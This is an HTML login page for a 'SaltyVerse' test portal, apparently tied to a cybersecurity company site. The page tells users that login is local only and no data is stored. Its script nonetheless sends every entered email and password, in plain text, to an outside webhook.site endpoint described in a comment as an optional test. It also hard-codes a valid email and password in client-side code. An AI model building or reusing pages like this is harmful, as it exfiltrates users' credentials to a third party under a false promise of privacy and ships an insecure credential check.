
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Welcome to the SaltyVerse Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      font-family: 'Montserrat', sans-serif;
      background: radial-gradient(circle at center, #0A0B1F, #01020C);
      color: #fff;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      max-width: 400px;
      background: rgba(20, 20, 40, 0.95);
      margin: 6vh auto;
      padding: 2rem;
      border-radius: 15px;
      box-shadow: 0 0 25px #FF3CAC, 0 0 50px #42FFB9;
      text-align: center;
    }

    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 1.8rem;
      margin-bottom: 1rem;
      color: #FFD700;
    }

    input {
      width: 100%;
      padding: 0.9rem;
      margin: 0.5rem 0;
      border-radius: 8px;
      border: none;
      font-size: 1rem;
      background: #111;
      color: #fff;
    }

    button {
      width: 100%;
      padding: 1rem;
      background: #FF3CAC;
      color: #000;
      font-weight: bold;
      font-size: 1rem;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: 0.3s ease;
    }

    button:hover {
      background: #42FFB9;
    }

    .shaniqua-img {
      width: 140px;
      margin: 20px auto 10px auto;
      display: block;
      border-radius: 12px;
      box-shadow: 0 0 12px #ff6bd9;
    }

    #status {
      margin-top: 1rem;
      font-size: 0.9rem;
      color: #79ffe1;
      min-height: 1.3em;
    }

    footer {
      text-align: center;
      font-size: 0.9rem;
      margin-top: 18px;
    }

    footer a {
      color: #42FFB9;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>SaltyVerse Test Login</h1>
    <img class="shaniqua-img" src="https://img1.wsimg.com/isteam/ip/aec3b6e1-5b89-48ed-9233-4199ef9cca45/Shaniquaseesyou.png" alt="Shaniqua" />
    <form onsubmit="handleLogin(event)">
      <input type="email" id="email" placeholder="Email (e.g., salty@getabot.com)" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Enter Portal</button>
      <div id="status">üîí Login is local only. No data stored.</div>
    </form>
    <footer>
      <a href="https://tntcybersolutions.com" target="_blank">‚Üê Back to TNT Cyber Solutions</a>
    </footer>
  </div>

  <script>
    async function handleLogin(e) {
      e.preventDefault();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      const status = document.getElementById("status");

      // Optional webhook test ‚Äî replace with your actual endpoint
      fetch("https://webhook.site/your-custom-url", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password, time: new Date().toISOString() })
      });

      if (email.toLowerCase() === "salty@getabot.com" && password === "SALTYBOT") {
        status.textContent = "‚úÖ Access granted! Shaniqua approves.";
      } else {
        status.textContent = "‚ùå Invalid test login.";
      }
    }
  </script>
</body>
</html>
